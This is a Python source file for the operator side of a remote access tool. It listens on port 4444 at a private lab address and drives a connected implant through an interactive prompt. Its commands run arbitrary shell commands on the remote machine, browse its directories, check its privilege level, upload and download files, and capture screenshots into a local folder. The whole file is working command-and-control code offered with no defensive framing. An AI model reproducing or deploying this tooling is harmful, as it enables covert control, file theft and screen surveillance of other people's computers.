import socket
import struct
import json
import os
import time
import logging
import sys

# Configure listening
LISTEN_IP = "192.168.94.136"
LISTEN_PORT = 4444
SCREENSHOT_DIR = "/home/jake/Desktop/Screenshots"

# Logging setup
logging.basicConfig(
    filename="server.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s",
)


def send_json(conn, obj):
    data = json.dumps(obj).encode("utf-8")
    header = struct.pack(">Q", len(data))
    conn.sendall(header + data)


def recv_json(conn):
    header = recv_all(conn, 8)
    if not header:
        return None
    length = struct.unpack(">Q", header)[0]
    data = recv_all(conn, length)
    return json.loads(data.decode("utf-8"))


def recv_all(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def handle_upload(conn, parts):
    local, remote = parts[1], parts[2]
    if not os.path.exists(local):
        print("Local file not found.")
        return
    size = os.path.getsize(local)
    send_json(conn, {"command": "upload", "path": remote, "size": size})
    with open(local, "rb") as f:
        conn.sendall(f.read())
    resp = recv_json(conn)
    print(resp)


def handle_download(conn, parts):
    remote, local = parts[1], parts[2]
    send_json(conn, {"command": "download", "path": remote})
    resp = recv_json(conn)
    if resp.get("status") == "ERROR":
        print(resp.get("message"))
        return
    size = resp.get("size")
    data = recv_all(conn, size)
    with open(local, "wb") as f:
        f.write(data)
    print(f"Wrote {size} bytes to {local}")


def handle_screenshot(conn):
    send_json(conn, {"command": "screenshot"})
    resp = recv_json(conn)
    size = resp.get("size")
    if size:
        data = recv_all(conn, size)
        fname = time.strftime("%Y%m%d_%H%M%S") + ".png"
        path = os.path.join(SCREENSHOT_DIR, fname)
        with open(path, "wb") as f:
            f.write(data)
        print(f"Screenshot saved to {path}")
    else:
        print("Screenshot failed")


def repl(conn):
    while True:
        cmd = input("> ").strip()
        if not cmd:
            continue
        parts = cmd.split()
        verb = parts[0].lower()
        if verb == "exit":
            send_json(conn, {"command": "exit"})
            break
        elif verb == "exec":
            send_json(conn, {"command": "exec", "cmd": " ".join(parts[1:])})
            resp = recv_json(conn)
            print(resp.get("output"))
        elif verb == "getcwd":
            send_json(conn, {"command": "getcwd"})
            resp = recv_json(conn)
            print(resp.get("cwd"))
        elif verb == "cd":
            send_json(conn, {"command": "cd", "path": parts[1]})
            resp = recv_json(conn)
            print(resp)
        elif verb == "ls":
            send_json(conn, {"command": "ls"})
            resp = recv_json(conn)
            print("\n".join(resp.get("entries", [])))
        elif verb == "priv":
            send_json(conn, {"command": "priv"})
            resp = recv_json(conn)
            print(resp.get("privilege"))
        elif verb == "upload":
            handle_upload(conn, parts)
        elif verb == "download":
            handle_download(conn, parts)
        elif verb == "screenshot":
            handle_screenshot(conn)
        else:
            print("Unknown command")


def main():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # allow immediate reuse of the port after exit
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((LISTEN_IP, LISTEN_PORT))
        s.listen(1)
        print(f"Listening on {LISTEN_IP}:{LISTEN_PORT}...")
        try:
            conn, addr = s.accept()
            print(f"Connection from {addr}")
            logging.info(f"Connection established with {addr}")
            repl(conn)
        except Exception as e:
            print(f"Server error: {e}")
            logging.exception("Server encountered an error")
            sys.exit(1)
        finally:
            try:
                conn.close()
            except:
                pass


if __name__ == "__main__":
    main()
